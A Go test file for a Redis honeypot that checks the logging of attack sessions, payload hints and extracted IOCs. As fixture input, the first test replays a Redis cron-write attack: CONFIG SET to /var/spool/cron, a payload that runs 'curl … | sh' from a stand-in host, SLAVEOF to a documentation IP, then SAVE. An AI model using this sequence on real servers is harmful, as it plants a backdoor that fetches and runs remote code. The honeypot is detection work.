package honeypot

import (
	"bufio"
	"net"
	"strings"
	"testing"

	"RedisHoneyPot/internal/fixtures"
)

func TestFileWriteSessionIsCapturedWithPayloadAndIOCs(t *testing.T) {
	server, stop := startLoggedServer(t, nil)
	conn, err := net.Dial("tcp", server.Addr().String())
	if err != nil {
		t.Fatalf("Dial returned error: %v", err)
	}
	reader := bufio.NewReader(conn)

	padding := strings.Repeat("#", 1200)
	payload := "\n\n*/5 * * * * curl -fsSL http://updates.example.net/a.sh | sh\n" + padding + "\n"
	for _, args := range [][]string{
		{"CONFIG", "SET", "dir", "/var/spool/cron"},
		{"CONFIG", "SET", "dbfilename", "root"},
		{"SET", "backup1", payload},
		{"SLAVEOF", "198.51.100.23", "8886"},
		{"SLAVEOF", "NO", "ONE"},
		{"SAVE"},
		{"QUIT"},
	} {
		if _, err := conn.Write(fixtures.Command(args...)); err != nil {
			t.Fatalf("write %v: %v", args, err)
		}
		if _, err := fixtures.ReadReply(reader); err != nil {
			t.Fatalf("read %v: %v", args, err)
		}
	}
	_ = conn.Close()

	var sawSet, sawSave, sawSlaveof, sawClose bool
	for _, event := range decodeLogEvents(t, stop()) {
		assertFlatLogEvent(t, event)
		switch {
		case event["event"] == "command" && event["command"] == "SET":
			sawSet = true
			if event["analysis_hint"] != "cron_payload" {
				t.Errorf("SET hint = %v, want cron_payload", event["analysis_hint"])
			}
			if event["value_text"] != payload || event["value_truncated"] != false {
				t.Errorf("SET value_text not captured completely (truncated=%v)", event["value_truncated"])
			}
			if event["ioc_urls"] != "http://updates.example.net/a.sh" || event["ioc_domains"] != "updates.example.net" {
				t.Errorf("SET IOCs = %v / %v", event["ioc_urls"], event["ioc_domains"])
			}
			if len(stringField(t, event, "args_text")) > maxLoggedArgsBytes {
				t.Errorf("args_text exceeds %d bytes", maxLoggedArgsBytes)
			}
		case event["event"] == "command" && event["command"] == "SLAVEOF" && event["replica_host"] == "198.51.100.23":
			sawSlaveof = true
			if event["ioc_ips"] != "198.51.100.23" {
				t.Errorf("SLAVEOF ioc_ips = %v", event["ioc_ips"])
			}
		case event["event"] == "command" && event["command"] == "SAVE":
			sawSave = true
			if event["analysis_hint"] != "redis_write_file_commit" || event["target_dir"] != "/var/spool/cron" || event["target_dbfilename"] != "root" {
				t.Errorf("SAVE event = %v", event)
			}
		case event["event"] == "close":
			sawClose = true
			hints := stringField(t, event, "session_hints")
			for _, want := range []string{"redis_write_file_attempt", "cron_payload", "redis_replication_attempt", "redis_write_file_commit"} {
				if !strings.Contains(hints, want) {
					t.Errorf("session_hints %q missing %s", hints, want)
				}
			}
			if event["session_command_count"] != float64(7) {
				t.Errorf("session_command_count = %v, want 7", event["session_command_count"])
			}
		}
	}
	if !sawSet || !sawSave || !sawSlaveof || !sawClose {
		t.Fatalf("missing events: set=%t save=%t slaveof=%t close=%t", sawSet, sawSave, sawSlaveof, sawClose)
	}
}

func TestPayloadLimitAndHints(t *testing.T) {
	attrs := commandAnalysisAttrsLimit([]string{"SET", "k", strings.Repeat("ä", 10)}, 5)
	fields := map[string]string{}
	for _, attr := range attrs {
		fields[attr.Key] = attr.Value.String()
	}
	if fields["value_text"] != "ää" || fields["value_truncated"] != "true" {
		t.Fatalf("truncated value_text = %q (%s), want two whole runes", fields["value_text"], fields["value_truncated"])
	}

	for value, want := range map[string]string{
		"\n\nssh-ed25519 AAAAC3Nza user@host\n\n": "ssh_key_payload",
		"ecdsa-sha2-nistp256 AAAAE2VjZHNh":        "ssh_key_payload",
		"\n@reboot /tmp/x\n":                      "cron_payload",
		"hello world":                             "",
		"10.0.0.1 is a host":                      "",
	} {
		if got := payloadHint(value); got != want {
			t.Errorf("payloadHint(%q) = %q, want %q", value, got, want)
		}
	}
}

func TestIOCAttrsAreFlatAndBounded(t *testing.T) {
	var args []string
	for i := 0; i < 40; i++ {
		args = append(args, "wget http://host"+strings.Repeat("x", i%3)+".example.org/"+string(rune('a'+i%26)))
	}
	args = append(args, "version 7.4.5 and 999.1.1.1")
	for _, attr := range iocAttrs(args) {
		if attr.Key == "ioc_urls" && len(strings.Fields(attr.Value.String())) > maxIOCsPerKind {
			t.Fatalf("ioc_urls not bounded: %d", len(strings.Fields(attr.Value.String())))
		}
		if attr.Key == "ioc_ips" {
			t.Fatalf("invalid IPs extracted: %q", attr.Value.String())
		}
	}
}
